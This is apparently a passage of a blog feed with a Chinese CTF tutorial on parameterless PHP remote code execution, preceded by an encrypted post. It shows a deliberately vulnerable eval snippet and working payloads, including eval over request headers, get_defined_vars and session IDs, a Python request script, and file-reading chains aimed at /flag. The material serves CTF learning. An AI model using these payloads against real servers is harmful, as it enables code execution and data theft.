97f486378c5dc636b342062840f945da8d1469107fc3b71427da39bdfb3b85a6434ae33a39baf31e8bc339a82eeedb5018f4d976cb2db8e6e74dfa842e4a49c13684ad9f5c04fc4b6c90760d83e651388e0a0b83ee0a73d9cd5d747025a78b0564e52d19dc3153413bab9f19b46e39b5b6dac1606d26eb198dd3b7299d83e918d695590cdbdd70d541e5cad669a6cc773005fae532746c9e664b06a6c284a5bf64a02e8997a4b035697e7dad8292a56ff85d13fddbb3376c5abf0d9eb3672d21dedfe4aa071e619fa5b6466d7927be0de796df29db1b173a1e85c9e9c129977ac71e5afb05dfc0171d754c8f233929241a3abd62bdb0e65253db1da2e90acc56f2d24a71678f3c2caa88ba93b0d892712baab5ff0569fe3a2b177fdd7c4ee561b16ace24f30dbfd4a6a164010e56465112415a67ea759ecf47139f58662453342abe75660f3b9578a00f97bb09708555ad4799ccc1a6779b5df74cfc5fd8a25cde878449851028ce8e2510754a00bf037f03db754fcf32e5ce8368a91dca8a020cdc5c906c63f23f4efefec13bd0351f7467a80c7c11b3db1e648ec6c06152c01f02606f6cf041269fdbbe9a41fc87abe1fb9cdff24689ef80c1473e592ba326b18ff9f23881c0d5fd7f8d802d54ce275555d47d62793b96a6ff3be1845395eb1e3d14b7b355fe1b750d85059cc266db25edabb4aec6b6ee91bdff63702f31dfb6271917a41f25c4537ddba67dfed89d889d85ad75f24b62aa826fe7756e654ebe5c84623bc9cb0dbc6446d85ffd2f2b03d6ed28be0f817f2be59c1ddd823bcf6ca064b29d37041ffeaa242aa510fd347d9a430eca402a47c70213742c80795488a670d0abef4b8db2946330a44e0481c75cb953bc9797c5cc2d6ef777c2bfbf953939509aca6d34b1fb441e3e20f3334ddfb9bc2d271bd0f90f430754670c802bfd218d1990a013154f8a95824e83009337c450595fadcd8aa46729dd089fee7cf715136cdffe2c14d6489194d7244241cfe1498dee5a2c14b0597875a003eaab13fa661761d5a69f16e0582a0f8dec84b228c41a6a41509b9c05460a6a612dd83a4033ff5fb24c9f7b44edb9b4e3fb41d8457462508597549615d468dd9e700ff94d39b582e73ce8db0762d10ef0c4a778254e1bf1f5415f3b7234d8386ac0ac2282447f92228801ab32c50ea30fded9e5fa36c54b290d2b66134720797144340283d0bf8259141dca0fbc2c645c89fc703cd221ceaef449633a96607280a362527f0c69185781e1ec77519612e3c221fa7c70fe696fbd565051e1ce2d40356b03ec44759a6f6fbf09028bc192e2dcacb4ae642f2c6f5e0b0b08d8cc645ab91b0c7dcef13ae10b3e1e10085603e348b89730c5246f9f6062796bd2ea6fffd637cdb37e84b8fce8f42aeea61cef0aa1a093eec12a76c3e8b29fcf26de403019f1221d8c9716f756dbebf9cd718dcd85077995a52259435f82ed05117dc4f24668814fc46d81764b23dc6e4b8909be3fdf4a512a4a6e31c4e76cb710af7a2fe45e8991a3478e73db219773c7c72096fbf20aaddbba21a47e4d3ac3194d08ff099ad40952b69356e720e006d4e697edc3ce74a153d4271c63d5d6b543577e844a47b1f98747236362b74f260a4c1f1d0ca6dd22567b767f3f73861882283d7b2ae3fb7b12951dfd47dc02cfba7b17da8e1774d95c66061e34ffb787763463c463d13995e8b6940baef66bd01c860c895ba245a3255191fb4b175c1779c51c684660b454729006a5ce29debd9850abbb1855167fe00c5c84eeeefcf874edfd510e54b3b28e29b0b56fc4ce4dffd45b233a1d6543604397d56f35cdf164040896416af95410d6c877ccec0bbe57ac53e2d5e59e4d345c9ab93cc34b4ffe8fb1691c273e33c913bfbc3b9bdc1ec32d36f7e28fcd9ec23c3dadafb3d9b562453396199d6307cce6febad73110a8d9393dad5e7a5beca6173636e75b17aa79daf5b1a8f4357af922a69a4857c1974ce2b76b047821969a9c4c5be2ebb333bedb06d951eef29b103377fb15853d95d014c5ca60322d5ffb26bb76ad075a935febeaac588bbde32431c98557ce1d5006fc9f9e765cca52c72472096963945026e4ddb3755fd66c6bcd1d4e327b91c804e54579ef9930e143914e1369348628ea32d868e5f662188ed0ec6d2b05d8862a0ed2e0d36fb53c325cf678444b0d710d9aecee1e1b6154b2ddaab2e394c334bb4d167493e2d7c9fbbceab230357c17a04eb8a2260c1af28945c2ded5b67df503cb36aa964865f2a42e8462ba426bd744d55a511ef5cd3a46a856d0fe375b186b93406c36e62192eaa646627ddb8aff7a30d8259b7069fdcc45577e2e4758af805aaf62342ddd70f05c98b624c1ff09447e9b1b47af6d3162c3af3be2c782b6280c4c4406b3ee0e46b045e97eaaa82453072c916355d240df7afe0899a0c843f508d7c7ba695b88ee124a6505fd9976e04288d654926a6829bc65482dd5a9f897d43b873fc4f0fcddd660d150f97ed0874e6c896fe8c83ae27d27753da6c340d4af45ff227e06c0981e75c2a4d9c71822813d878f4a3529225da0588e4df77b5ba909d56ff316b9d8028b038cb7a99668d2d97512b85119c2cba9d350f4a4787198fa8fd0695d50e913ec7170fc344fb6a324e7e8a8d6a2eed286df1451eb1bf6c1b245fd1b71592139b0b225fd703bc952d79daa95b9dfc7d61b0f2edd757c3b64ecbfbf5056edd2547782660b3292d5dfcb65f6f921e9aea080a45c400505fdf7378ad420c79a5c657c063c694b71a1678f78d1ed361fbc7a3d157b132264d2a17576cb8fc7c6597e7688c870b2498362adefb65ef9037a4f31e44c07174e624954f99fb8464db7a2f2319977e60f217dffa8b453646e433bdf7879bf666e0623820f5e8ef01e81ca14e2bda8cb55a8553d70f03cf865a7b026724716b943f077b508016b37878f7d8e4cf5b25dfad06f219223fa6a1d2cd9ef3900245dc168a3601a6fcde3bbdf34fae75f883ca9841881aa56f87fabc451642a4775d62adb47e88188f0226d2102899637fce299594f401586c4d0c2b63178fe78b39160cfa30342863d96c85e7a7b84be0757aac6b107d7ef19a6c40d1e87b27f46734acdac3aa40dbb10bf50ae63e4a992fb64929ab2277d8d6e18c52d4aaa8a930589e30e9b39498dede04a12b8c75921c5f31ddf02f5d4b611bd591f9292714c8eb683d5fa656a5602135a9d21cea177bb76b3c604670c9818249d92036b4572d13b6ed069a2cc6f2c1d093a112cda2950247d838f9f08220f5f42f1ecb7d2ab7c0b087c460334cdd77bf8226483cebcff03e837e87b290250d807691948fd838c891720025fb90deb375dea625e3c88e7f9278ad7aaf1a81cb89cc47ffdab88a1c326b93b6f0df9f087340fe8ee6d7f4efa9311eb86c345bc972c26b6d03f1cebafd47c4aea3d612e9658940a96f2e0370af498d6d1071248e3f4f5fcdaca49d168b487f67a7eb97519453d2b1345b48f9962880dd7ac9874fcef1c144c66520e69c403b7919dbf29a92ba1add7cac8cf18e08e4cb159d6ee6773590f982706c2a874c87e224bf5266216242dc70647dd1b1444aeaefce9c064f5b2b3cd4bf89e0cddf48e3ec7a4477299f7904bec1ad5b1a4dd0bc0505ded926d2bf5bb8b8b211cbee75c31d1e4f30bd4c75b809adb20df3839ede1870e1df5fe0ad960e2f8f50ff81ef813b43db67858ae82b7f8c7b862fa0dea656afe747f99e1aa33335b1154b3d3c5ae6c7c2977c19a1ca23061b3f6d58a7c9d1447c08a2bf61c805736285d64127321bed70fb3cb068235fa507e9b2f66f1213782981180a6419df7e0772dded20a12928ced038cab6c32822f0387dedf118a2efacc797e1490cb3158d18db98bfc0ff34d503a71f21dbcd8cce32350a5b1a3420b46e8cb06dfab02d00043793073e4e4c1b41b866cd2eb1ea1930785bd956f8c3f17ba657618ebb0b55b7ce079cfeed286ef284153fa9a2d9573b84153a7beeff5dabe4197879ae6b384d4ca420c7c7baf38caa8a574eefca7caba10674f692313108fcc1cc75c15772b2af8e302a2395fc5fb144957c66ddfee5962e90069d9e5ab664e364178dd9ebd48c56a5c0e8300ece89f7e8942d64d349ebd2d256d85895bfd7ccec0e5b3a92b505d09a69e4e3b68af0fe3f4c64d4868eed07319481fd3e66f7838af252d4c2be742c9311a19e861b943d8a958dd8b8b7d330d1f7e87d88ad145550908e7ad39fa877a06988f7896b26c7495ff4e8e8c2df995db8d1b573a2f4845dc3e7670fc953126577e830680529c7699099c993ef5e9c830ab94ab40ebf210af0467979c527e4169922afbfb3658781b69e2bd03909273bf42eb97b35eaf46e5712c6bfb8dca889bfbc5a9150279dfa3449254854d24f057010fdf6d6e5b40832fca929ab000333354cc354c96e09780d9541509c6f3d25ff849e7999715f72249ab6980b476e3fc45f93175cc368abdc24af68a604eb577a3a76eaa24b4258f07a38e0bacb96f418ade7da128e98cee6840567db80462b9821eb699651683c7b53afcac8862675d91eb952f1e834f152aa8206eedb1262ac6cf016dc3e506c67a7daf194f2b785da7b927b4f477c81c681dfedd187c831622ebe98668a03728dc70edccadd87a62f6f6e4d90</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— å‚æ•°rec</title>
      <link href="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
      <url>/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>è¿™é‡Œä½¿ç”¨preg<em>replaceæ›¿æ¢åŒ¹é…åˆ°çš„å­—ç¬¦ä¸ºç©ºï¼Œ\wåŒ¹é…å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [^A-Za-z0-9</em>]ï¼Œç„¶å(?R)?è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºç©ºï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰;<br>ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…a(b(c()))æˆ–a()è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…a(â€œ123â€)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚</p><h1 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h1><pre><code class="php">ç›®å½•æ“ä½œï¼šgetchwd() ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚æ•°ç»„ç›¸å…³çš„æ“ä½œï¼šend() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼ã€‚array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚array_slice() å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚è¯»æ–‡ä»¶show_source() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚readfile() - è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚highlight_file() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚file_get_contents() - æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚readgzfile() - å¯ç”¨äºè¯»å–é gzip æ ¼å¼çš„æ–‡ä»¶    ç¼–ç chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚hex2bin() â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</code></pre><h1 id="å…³é”®å‡½æ•°"><a href="#å…³é”®å‡½æ•°" class="headerlink" title="å…³é”®å‡½æ•°"></a>å…³é”®å‡½æ•°</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**è·å–ç¯å¢ƒå˜é‡çš„å€¼(åœ¨PHP7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</p><p>é€‚ç”¨äºï¼šphp7ä»¥ä¸Šçš„ç‰ˆæœ¬</p><p>php7.0ä»¥ä¸‹ç‰ˆæœ¬è¿”å›bool(false)</p><pre><code>?code=var_dump(getenv());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p><p>php7.0ä»¥ä¸Šç‰ˆæœ¬</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p><p>è¿˜å¯ä»¥é€šè¿‡è¿™ä¸ªæ‰“å¼€phpinfo()é¡µé¢</p><pre><code>?code=var_dump(getenv(phpinfo()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**è·å–æ‰€æœ‰ HTTP è¯·æ±‚æ ‡å¤´ï¼Œæ˜¯apache_request_headers()çš„åˆ«åå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°åªèƒ½åœ¨Apacheç¯å¢ƒä¸‹ä½¿ç”¨</p><pre><code>?code=print_r(getallheaders());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p><p><strong>payload1</strong></p><pre><code>?code=eval(reset(getallheaders()));# postä¸­å¢åŠ è¯·æ±‚å¤´flag: system(&#39;whoami&#39;);</code></pre><p>åœ¨æˆ‘çš„burpä¸­ç»è¿‡æµ‹è¯•ï¼Œè®¾ç½®çš„è¯·æ±‚å¤´è·‘åˆ°äº†æœ€å‰é¢ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä¹Ÿå¾ˆå¥‡æ€ªï¼Œç½‘ä¸Šæµä¼ çš„æ˜¯å–æœ€åä¸€ä¸ªå¤´ï¼Œé‚£æˆ‘è¿™é‡Œå°±å–ç¬¬ä¸€ä¸ªå§ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œæ·»åŠ è¯·æ±‚å¤´</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p><p>è¾“å‡ºä¸€ä¸‹ç¬¬ä¸€ä¸ªè¯·æ±‚å¤´</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬æ„é€ çš„è¯·æ±‚å¤´åœ¨æœ€å¼€å§‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºpayloadã€‚å…¶å®åœ¨å¼€å¤´è¿˜æ˜¯ç»“å°¾ï¼Œé—®é¢˜éƒ½ä¸å¤§ï¼Œçµæ´»å˜é€šå³å¯ã€‚</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p><p><strong>payload2</strong></p><p>åœ¨php7ä»¥ä¸Šçš„ç‰ˆæœ¬ä½¿ç”¨</p><pre><code>?code=eval(end(apache_request_headers()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p><pre><code>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å›$_GET,$_POST,$_COOKIE,$_FILESå…¨å±€å˜é‡çš„å€¼ï¼Œè¿”å›æ•°ç»„é¡ºåºä¸ºget-&gt;post-&gt;cookie-&gt;files</code></pre><p><strong>current:</strong></p><pre><code>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›$_GETå˜é‡çš„æ•°ç»„å€¼</code></pre><p><strong>payload1</strong></p><pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p><p><strong>payload2</strong></p><pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p><p><strong>payload3</strong></p><pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></pre><p><strong>poså‡½æ•°:</strong></p><pre><code>pos()æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºè¿”å›å†…éƒ¨æŒ‡é’ˆå½“å‰æŒ‡å‘çš„æ•°ç»„ä¸­å…ƒç´ çš„å€¼ã€‚è¿”å›å€¼åï¼Œpos()å‡½æ•°ä¸ä¼šé€’å¢æˆ–é€’å‡å†…éƒ¨æŒ‡é’ˆã€‚</code></pre><p>è§£é‡Šä¸‹è¿™ä¸ªpayload</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p><p>æˆ‘ä»¬å‘ç°flagçš„å€¼æ˜¯è¢«åµŒå¥—åœ¨ä¸¤ä¸ªæ•°ç»„ä¸­ï¼Œå› æ­¤å¦‚æœè¦å–å‡ºflagçš„å€¼ï¼Œè¦æ‰§è¡Œä¸¤æ¬¡pos</p><p>ç¬¬ä¸€æ¬¡posï¼š</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" alt="image-20220411002803950"></p><p>ç¬¬äºŒæ¬¡posï¼š</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p><p>æˆåŠŸå–å‡ºï¼ŒåŠ ä¸Ševalå‡½æ•°å°±å¯ä»¥æ‰§è¡Œäº†</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p><p><strong>payload4</strong></p><pre><code class="python">import requestsfiles = &#123;   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</code></pre><p><code>è€Œå¦‚æœç½‘ç«™å¯¹$_GET,$_POST,$_COOKIEéƒ½åšçš„è¿‡æ»¤ï¼Œ é‚£æˆ‘ä»¬åªèƒ½ä»$_FILESå…¥æ‰‹äº†ï¼Œfileæ•°ç»„åœ¨æœ€åä¸€ä¸ªï¼Œéœ€è¦endå®šä½ï¼Œç„¶åposä¸¤æ¬¡å®šä½è·å¾—æ–‡ä»¶å</code></p><h2 id="session-start-å‡½æ•°"><a href="#session-start-å‡½æ•°" class="headerlink" title="session_start()å‡½æ•°"></a>session_start()å‡½æ•°</h2><p>é€‚ç”¨äºï¼šphp7ä»¥ä¸‹çš„ç‰ˆæœ¬</p><p><strong>session_start()</strong></p><pre><code>å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› TRUE ï¼Œåä¹‹è¿”å› FALSE,è¿”å›å‚æ•°ç»™session_id()</code></pre><p><strong>session_id()</strong></p><pre><code>è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰</code></pre><p>å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„<code>phpsessionid</code>äº†ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚</p><p>ä½†å…¶æœ‰é™åˆ¶ï¼š</p><p><strong>æ–‡ä»¶ä¼šè¯ç®¡ç†å™¨ä»…å…è®¸ä¼šè¯ ID ä¸­ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ï¼ša-z A-Z 0-9 ,ï¼ˆé€—å·ï¼‰å’Œ - ï¼ˆå‡å·ï¼‰</strong></p><p>è§£å†³æ–¹æ³•ï¼šå°†å‚æ•°è½¬åŒ–ä¸º16è¿›åˆ¶ä¼ è¿›å»ï¼Œä¹‹åå†ç”¨hex2bin()å‡½æ•°è½¬æ¢å›æ¥å°±å¯ä»¥äº†ã€‚</p><p><strong>hex2bin()</strong></p><pre><code>è½¬æ¢16è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</code></pre><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>payload</p><pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><pre><code> show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))); highlight_file(session_id(session_start())); readfile(session_id(session_start())); ç„¶åæŠ“åŒ…ä¼ å…¥Cookie: PHPSESSID=(æƒ³è¯»çš„æ–‡ä»¶)å³å¯</code></pre><p>payload</p><pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p><p>è¿™ç§æ–¹æ³•æˆ‘å¹¶æ²¡æœ‰æµ‹è¯•æˆåŠŸï¼Œå…ˆå†™ä¸‹æ¥å§ã€‚</p><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶å</strong></p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p><p>æ–‡ä»¶è¯»å–</p><p><strong>è¯»å–å½“å‰ç›®å½•æ–‡ä»¶</strong></p><pre><code>å½“å‰ç›®å½•å€’æ•°ç¬¬ä¸€ä½æ–‡ä»¶ï¼šshow_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));å½“å‰ç›®å½•å€’æ•°ç¬¬äºŒä½æ–‡ä»¶ï¼šshow_source(next(array_reverse(scandir(getcwd()))));éšæœºè¿”å›å½“å‰ç›®å½•æ–‡ä»¶ï¼šhighlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p><p>å¤šè¯•å‡ æ¬¡</p><p><strong>æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•æ–‡ä»¶å</strong></p><pre><code>print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p><p>å‡½æ•°è§£é‡Š</p><pre><code>array_flip()ï¼šäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥è¿”å› NULLã€‚array_rand()ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ª(é»˜è®¤ä¸º1)ï¼Œarray_rand() è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ å®Œæˆåï¼Œå°±å¯ä»¥æ ¹æ®éšæœºçš„é”®è·å–æ•°ç»„çš„éšæœºå€¼ã€‚array_flip()å’Œarray_rand()é…åˆä½¿ç”¨å¯éšæœºè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ådirname(chdir(dirname()))é…åˆåˆ‡æ¢æ–‡ä»¶è·¯å¾„</code></pre><p><strong>æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</strong></p><p>æ‰€è·å¾—çš„å­—ç¬¦ä¸²ç¬¬ä¸€ä½æœ‰å‡ ç‡æ˜¯/ï¼Œéœ€è¦å¤šè¯•å‡ æ¬¡</p><pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p><h1 id="ctfé¢˜ç›®è®²è§£"><a href="#ctfé¢˜ç›®è®²è§£" class="headerlink" 